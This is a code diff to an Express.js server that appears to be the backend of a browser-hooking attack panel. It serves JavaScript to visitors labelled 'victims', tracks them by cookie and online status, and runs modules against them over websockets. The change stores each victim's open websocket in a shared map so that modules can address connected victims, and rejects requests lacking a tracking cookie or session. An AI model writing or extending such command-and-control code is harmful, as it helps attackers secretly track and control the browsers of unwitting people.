@@ -1,5 +1,6 @@
 var express = require('express'),
-    router = express.Router();
+    router = express.Router(),
+    auws = {};
 
 router.all('/', function(req, res){
     res.header('Content-Type', 'application/javascript');
@@ -28,9 +29,8 @@ router.all('/i/', function(req, res){
                 modules:info.modules,
                 status:{},
                 now:Date.now()
-            }, function(){
-                return res.jsonp(info.load);
             });
+            return res.jsonp(info.load);
         });
     });
 });
@@ -42,7 +42,7 @@ function online(who, on){
         });
     });
 };
-function handle(req, res, modules, owner, victim, who, msg){
+function handle(req, res, modules, auws, victim, who, msg){
     var share = {};
     var path = fs.realpathSync('.');
     for(var i in modules){
@@ -57,7 +57,7 @@ function handle(req, res, modules, owner, victim, who, msg){
             continue
         };
         share[modules[i][0]].unshift(
-            m({q:req, s:res}, {v:victim, w:who}, {p:modules[i][1], s:share}, {o:owner, g:msg})
+            m({q:req, s:res}, {v:victim, w:who}, {p:modules[i][1], s:share}, {o:auws, g:msg})
         );
     };
 };
@@ -66,10 +66,9 @@ var http = function(req, res){
     var pageid = req.params.uri;
     var who = req.cookies.who;
     sql.Page.findOne({uri:pageid}, function(err, info){
-        if(!info)return err404(req, res);
-        var owner = req.session.user&&(req.session.user.name == info.owner);
-        !owner&&online(who, Date.now());
-        handle(req, res, info.modules, owner, sql.Victim, who, null);
+        if(!info||(!who&&!req.session.user))return err404(req, res);
+        !(req.session.user&&(req.session.user.name == info.owner))&&online(who, Date.now());
+        handle(req, res, info.modules, null, sql.Victim, who, null);
     });
 };
 router.all('/h/:uri', http);
@@ -79,16 +78,19 @@ exports.ws = function(ws, req){
     var pageid = req.params.uri;
     var who = req.cookies.who;
     sql.Page.findOne({uri:pageid}, function(err, info){
-        if(!info)return null;
+        if(!info||(!who&&!req.session.user))return null;
         var owner = req.session.user&&(req.session.user.name == info.owner);
+        who = (req.session.user&&(req.session.user.name == info.owner))?null:who;
         ws.on('open', function(){
+            auws[who] = ws;
             return !owner&&online(who, 'online');
         });
         ws.on('close', function(){
+            delete auws[who];
             return !owner&&online(who, Date.now());
         });
         ws.on('message', function(msg){
-            handle(req, ws, info.modules, owner, sql.Victim, who, msg);
+            handle(req, ws, info.modules, auws, sql.Victim, who, msg);
         });
     });
 };
